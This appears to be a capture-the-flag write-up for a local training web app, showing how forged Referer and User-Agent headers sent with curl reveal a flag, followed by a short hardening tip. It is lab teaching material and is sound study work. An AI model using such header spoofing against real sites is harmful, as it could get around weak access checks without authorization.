# Fake headers

__http://192.168.56.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f__

## Description
There are a lot of comments in the html. One of them is 
```
<!--
You must come from : "https://www.nsa.gov/".
-->
```
```
<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```
That looks like a hint. We see ft_bornToSec header.

## Form Outputs
 We can use that for header
```
curl http://192.168.56.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f -s -o nohead.html
curl 'http://192.168.56.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" -s -o head.html
```

## Flag
```
diff nohead.html head.html | grep flag
```
The output is with the flag

## Safety
Use Secure Protocols and Headers: Employ HTTPS/TLS for secure communication between the server and the user's browser. Additionally, be mindful of headers such as "Referer" and "User-Agent" and utilize them correctly to ensure the desired behavior and security of your application.
